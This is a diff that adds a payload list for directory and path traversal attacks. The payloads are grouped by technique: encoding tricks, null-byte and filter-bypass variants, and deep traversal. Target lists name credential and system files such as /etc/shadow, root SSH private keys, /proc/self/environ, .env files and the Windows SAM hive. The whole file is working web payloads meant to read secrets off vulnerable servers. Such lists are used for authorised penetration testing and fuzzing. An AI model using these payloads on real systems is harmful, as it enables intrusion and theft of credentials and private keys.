@@ -1,0 +1,225 @@
+# Directory Traversal / Path Traversal Payloads
+
+## ========================================
+## BASIC TRAVERSAL
+## ========================================
+
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../
+
+## ========================================
+## LINUX TARGETS
+## ========================================
+
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+../../../etc/shadow
+../../../etc/hosts
+../../../etc/hostname
+../../../etc/group
+../../../proc/self/environ
+../../../var/log/apache2/access.log
+../../../var/log/nginx/access.log
+../../../home/user/.bash_history
+../../../root/.ssh/id_rsa
+
+## ========================================
+## WINDOWS TARGETS
+## ========================================
+
+..\..\..\..\windows\win.ini
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\boot.ini
+../../../../windows/win.ini
+../../../../windows/system32/drivers/etc/hosts
+../../../../boot.ini
+
+## ========================================
+## URL ENCODING
+## ========================================
+
+..%2F..%2F..%2Fetc%2Fpasswd
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+## ========================================
+## DOUBLE URL ENCODING
+## ========================================
+
+..%252F..%252F..%252Fetc%252Fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+
+## ========================================
+## UNICODE ENCODING
+## ========================================
+
+..%c0%af..%c0%af..%c0%afetc/passwd
+..%c1%9c..%c1%9c..%c1%9cetc/passwd
+..%c0%2f..%c0%2f..%c0%2fetc/passwd
+
+## ========================================
+## MIXED SLASHES
+## ========================================
+
+../../../etc/passwd
+..\/..\/..\/etc/passwd
+..\/..\/..\/ etc/passwd
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+
+## ========================================
+## NULL BYTE (PHP < 5.3)
+## ========================================
+
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.txt
+
+## ========================================
+## DOT VARIATIONS
+## ========================================
+
+.../.../.../.../etc/passwd
+..;/..;/..;/etc/passwd
+....../....../....../etc/passwd
+
+## ========================================
+## BACKSLASH VARIATIONS
+## ========================================
+
+..\..\..\etc\passwd
+..\\..\\..\\etc\\passwd
+..\\\...\\\...\\\etc\\\passwd
+
+## ========================================
+## BYPASS FILTERS
+## ========================================
+
+# If ../ is filtered
+....//
+..../
+....\
+.../.\
+
+# If / is filtered
+..\
+%5C
+%2F
+
+# If . is filtered
+%2e%2e/
+%252e%252e/
+
+## ========================================
+## ABSOLUTE PATH
+## ========================================
+
+/etc/passwd
+/etc/shadow
+/var/www/html/index.php
+C:\windows\win.ini
+C:\boot.ini
+
+## ========================================
+## WITH FILENAME SUFFIX
+## ========================================
+
+../../../etc/passwd.jpg
+../../../etc/passwd.php
+../../../etc/passwd.txt
+../../../etc/passwd;.jpg
+
+## ========================================
+## CASE SENSITIVITY (Windows)
+## ========================================
+
+../../../EtC/pAsSwD
+../../../WINDOWS/WIN.INI
+../../../Windows/System32/Config/SAM
+
+## ========================================
+## DEEP TRAVERSAL
+## ========================================
+
+../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../etc/passwd
+../../../../../../../../../../../../../../../etc/passwd
+
+## ========================================
+## WITH CURRENT DIRECTORY
+## ========================================
+
+./././etc/passwd
+./../etc/passwd
+./.././../etc/passwd
+./.././.././.././etc/passwd
+
+## ========================================
+## BYPASS WITH BASE PATH
+## ========================================
+
+# If app prepends /var/www/
+../../../../etc/passwd
+
+# If app appends extension
+../../../etc/passwd%00
+
+## ========================================
+## INTERESTING FILES (Linux)
+## ========================================
+
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/motd
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/stat
+/proc/self/status
+/proc/self/fd/[0-255]
+/proc/version
+/proc/cpuinfo
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+/home/user/.bash_history
+/home/user/.ssh/id_rsa
+/home/user/.ssh/authorized_keys
+/root/.bash_history
+/root/.ssh/id_rsa
+/root/.ssh/authorized_keys
+/var/www/html/.htpasswd
+/var/www/html/.env
+
+## ========================================
+## INTERESTING FILES (Windows)
+## ========================================
+
+C:\boot.ini
+C:\Windows\win.ini
+C:\Windows\System32\drivers\etc\hosts
+C:\Windows\System32\config\sam
+C:\Windows\System32\config\system
+C:\Windows\System32\config\security
+C:\inetpub\wwwroot\web.config
+C:\inetpub\logs\LogFiles\
+C:\Windows\debug\NetSetup.log
+C:\Windows\repair\sam
+C:\Windows\repair\system
+C:\Users\Administrator\Desktop\
